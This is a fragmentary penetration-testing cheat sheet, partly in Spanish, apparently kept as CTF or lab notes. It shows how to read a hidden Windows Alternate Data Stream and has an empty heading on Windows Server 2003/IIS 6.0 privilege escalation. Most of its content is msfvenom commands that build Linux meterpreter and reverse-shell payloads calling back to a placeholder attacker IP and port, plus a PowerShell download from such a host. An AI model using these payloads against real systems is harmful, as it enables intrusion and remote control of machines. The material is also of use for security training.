...
¿Alguna información oculta dentro de un archivo? (Alternate Data Stream)
```console
dir /r
example.txt:root.txt:$DATA
more  < example.txt:root.txt
```
...
### Windows Server 2003 and IIS 6.0 privledge escalation.
...
```console
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf > rev
```
#### Linux  reverse shell TCP.
```console
msfvenom -p linux/x86/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf > rev
```
...
```console
powershell wget http://[IP]/archivo -OutFile archivo
```
